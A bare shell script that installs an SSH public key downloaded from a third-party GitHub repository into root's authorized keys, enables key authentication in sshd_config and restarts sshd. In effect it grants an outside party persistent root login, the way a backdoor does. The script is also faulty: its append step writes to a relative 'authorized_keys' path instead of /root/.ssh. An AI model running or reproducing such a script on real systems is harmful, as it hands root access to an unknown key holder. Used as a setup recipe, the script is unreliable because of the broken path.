apt-get update
apt-get -y install wget
mkdir /root/.ssh
wget https://github.com/fffgg3g/incodeserver/raw/master/gongmi.gongmi -O /root/.ssh/ras.pub
cat /root/.ssh/ras.pub >> authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 744 /root/.ssh
sed -i '$a\AuthorizedKeysFile     /root/.ssh/authorized_keys'  /etc/ssh/sshd_config
sed -i '$a\RSAAuthentication yes'  /etc/ssh/sshd_config
sed -i '$a\PubkeyAuthentication yes'  /etc/ssh/sshd_config
service sshd restart
